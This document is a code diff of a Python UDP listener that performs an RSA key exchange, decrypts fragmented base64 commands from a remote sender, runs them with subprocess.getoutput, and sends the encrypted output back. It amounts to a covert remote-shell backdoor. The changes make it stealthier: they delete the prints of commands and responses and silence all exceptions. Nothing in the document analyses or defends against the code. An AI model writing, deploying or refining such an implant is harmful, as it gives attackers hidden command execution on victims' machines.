@@ -1,8 +1,9 @@
-import subprocess, rsa, socket, threading, time, random, base64
+import subprocess, rsa, socket, time, random, base64, time, gc
 from encryption import encrypt_message
 from decryption import decrypt_message
 from message_fragmentation import fragment_message
-import time
+
+
 my_pub_key = None
 my_priv_key = None
 target_pub_key = None
@@ -31,19 +32,19 @@ def listener():
         data, addr = sock.recvfrom(4096)
         ip, target_port = addr
         cmd = data.decode('utf8')
-        if cmd.startswith("gen_key"):
-            if my_pub_key is None or my_priv_key is None:
-                ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
-            time.sleep(1)
-            sock.sendto(f"PublicKey({my_pub_key.n}, {my_pub_key.e})|1|0".encode('utf8'), (ip, target_port))
-            continue
-
-        
-        if cmd.startswith("PublicKey("):
-            target_pub_key = parse_public_key(cmd)
-            continue
-
         try:
+            if cmd.startswith("gen_key"):
+                my_priv_key, my_pub_key = None, None
+                gc.collect()
+                ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
+                time.sleep(1)
+                sock.sendto(f"PublicKey({my_pub_key.n}, {my_pub_key.e})|1|0".encode('utf8'), (ip, target_port))
+                continue
+
+            if cmd.startswith("PublicKey("):
+                target_pub_key = parse_public_key(cmd)
+                continue
+        
             part, total, index, port = cmd.split('|', 3)
             index = int(index)
             total = int(total)
@@ -56,9 +57,7 @@ def listener():
                 full_command = base64.b64decode(full_command)
 
                 full_command = decrypt_message(full_command, my_priv_key)["message"]
-                print(full_command)
                 response = subprocess.getoutput(full_command)
-                print(response)
                 response = encrypt_message(response, target_pub_key)
                 if response["status"] == 200:
                     response = base64.b64encode(response["message"].encode()).decode()
@@ -75,7 +74,7 @@ def listener():
 
             else:
                 pass
-        except Exception as e:
-            print(e)
+        except:
+            pass
         
 listener()
